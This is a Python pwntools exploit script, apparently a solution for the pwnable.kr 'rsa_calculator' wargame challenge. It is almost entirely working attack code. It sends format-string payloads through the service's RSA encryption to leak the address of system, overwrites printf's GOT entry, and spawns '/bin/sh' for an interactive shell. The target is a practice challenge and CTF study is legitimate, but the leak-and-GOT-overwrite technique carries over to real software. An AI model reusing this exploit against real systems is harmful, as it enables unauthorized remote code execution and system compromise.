from pwn import * 
from binascii import hexlify, unhexlify 
import sys 
if sys.argv[1] == "1" : 
    sh = process("./rsa_calculator") 
else : 
    sh = remote("pwnable.kr",9012)
p = 30253
q = 20443
n = p * q 
e = 5 
d = 123682277

def encrypt_rsa(string) : 
    cipher = '' 
    for char in string : 
        encode = pow(ord(char),e,n) 
        encode = unhexlify(hex(encode)[2:].zfill(8))[::-1] 
        encode = hexlify(encode) 
        cipher += encode 
    return cipher 

def decrypt_rsa(cipher) : 
    p = '' 
    for i in range(0,len(cipher),8) : 
        c = cipher[i : i+8]
        c = int(hexlify(unhexlify(c)[::-1]),16) 
        m = pow(c,d,n) % 256 
        p += chr(m) 
    return p

def set_key() : 
    print sh.recvuntil("> ") 
    sh.sendline("1") 
    sh.sendlineafter("p : ",str(p))
    sh.sendlineafter("q : ",str(q)) 
    sh.sendlineafter("e : ",str(e))
    sh.sendlineafter("d : ",str(d)) 

def encrypt(string) : 
    assert len(string) <= 1024 
    print sh.recvuntil("> ")
    sh.sendline("2")
    sh.sendlineafter("how long is your data?(max=1024) : ",str(len(string)))
    sh.sendlineafter("paste your plain text data\n",string) 
    sh.recvuntil("-encrypted result (hex encoded) -\n")
    encode =  sh.recvline().strip() 
    return encode 

def decrypt(cipher) : 
    assert len(cipher) <= 1024 
    print sh.recvuntil("> ")
    sh.sendline("3") 
    sh.sendlineafter("how long is your data?(max=1024) : ",str(len(cipher)))
    sh.sendlineafter("paste your hex encoded data\n",str(cipher)) 
    print sh.recvline()
    decode = sh.recvline().strip()
    return decode 

if __name__ == '__main__' : 
    set_key() 
    
    #read system addr 
    encode = encrypt_rsa("%12$s")
    encode = p64(0x602538) +  encode
    decode =  decrypt(encode)
    system = int(hexlify( decode[1:][::-1]),16)
    log.success("system addr = " + hex(system))

    #overwrite printf.got -> system 
    system_hex = hex(system)[2:].zfill(16) 

    printf_got = 0x602028
    payload =  "%46$hn%47$hn" + "%64x%48$hn" + "%1920x%49$hn"
      
    encode = encrypt_rsa(payload) + p64(printf_got + 6) + p64(printf_got + 4) + p64(printf_got + 2) + p64(printf_got)
    decode = decrypt(encode) 

    # get shell  
    encode = encrypt_rsa("/bin/sh\0")
    print encode
    log.success("getshell")
    raw_input("DEBUG")
    #decrypt(encode) 
    sh.interactive()
